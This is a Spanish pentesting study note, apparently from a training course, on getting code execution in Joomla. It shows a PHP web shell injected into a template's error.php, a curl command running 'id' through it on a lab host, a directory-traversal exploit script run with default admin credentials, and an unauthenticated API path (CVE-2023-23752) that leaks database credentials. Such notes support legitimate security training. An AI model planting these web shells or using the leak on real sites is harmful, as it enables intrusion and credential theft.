---
tags:
  - Web/Red-Team
  - Joomla
  - Pentesting/Explotacion
Descripción: "Como en WordPress y Drupal, la vía principal de RCE en Joomla es entrar al backend admin y abusar de la edición de plantillas"
Fecha de actualización: 2026-07-16
Nota previa: "[[00 - Descubrimiento y enumeración de Joomla]]"
Nota siguiente: "[[00 - Descubrimiento y enumeración de Drupal]]"
Area: "[[Common Applications.base|Common Applications]]"
---
---

Como en [[04 - RCE como administrador en WordPress|WordPress]] y [[01 - Ataques a Drupal|Drupal]], la vía principal de RCE en Joomla es <mark style="background: #FFB86CA6;">entrar al backend admin y abusar de la edición de plantillas</mark>. Las credenciales suelen salir de la fase de enumeración (leaks, defaults como `admin:admin`).

# Abusar de funcionalidad: editar una plantilla

Con acceso a `/administrator`, se edita una plantilla para inyectar PHP:

1. **Templates** (Configuration) → elegir una (p. ej. `protostar`) → *Customise*.
2. Editar una página, p. ej. `error.php`, y añadir el web shell:

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

3. **Save & Close** → ejecutar en `/templates/protostar/error.php?<md5>=id`:

```shell-session
$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> [!warning]+ Gotcha del panel
> Si tras login aparece *"Call to a member function format() on null"*, desactivar el plugin **"Quick Icon - PHP Version Check"** en `index.php?option=com_plugins` para que el panel cargue. Como siempre: nombre de fichero no estándar, y limpiar el web shell al terminar (anotándolo para el informe).

# Vulnerabilidades conocidas

Joomla acumula 400+ CVEs, la mayoría en **extensiones** (las RCE de *core* son raras). Un ejemplo de core:

- **CVE-2019-10945** — *directory traversal* + borrado de ficheros autenticado (1.5.0–3.9.4). `joomla_dir_trav.py --url .../administrator/ --username admin --password admin --dir /` lista el webroot (útil si el panel no es accesible desde fuera; con creds admin ya tienes RCE por la plantilla).

> [!info]+ Modernización: la CVE que importa hoy
> HTB (2021) no la cubre, pero es **la** vulnerabilidad Joomla del momento: <mark style="background: #FF5582A6;">**CVE-2023-23752**</mark> — *information disclosure* **no autenticada** en Joomla 4.0.0–4.2.7. Una petición a la API REST (`/api/index.php/v1/config/application?public=true`) <mark style="background: #FFB86CA6;">filtra la configuración, incluidas las credenciales de la base de datos</mark>. Es de las más explotadas en bug bounty y por atacantes reales. Herramientas de fingerprint/scan: [`joomscan`](https://github.com/OWASP/joomscan), `droopescan`, y `nuclei -tags joomla` para cruzar versión↔CVE.

Siguiente CMS: [[00 - Descubrimiento y enumeración de Drupal|Drupal]].
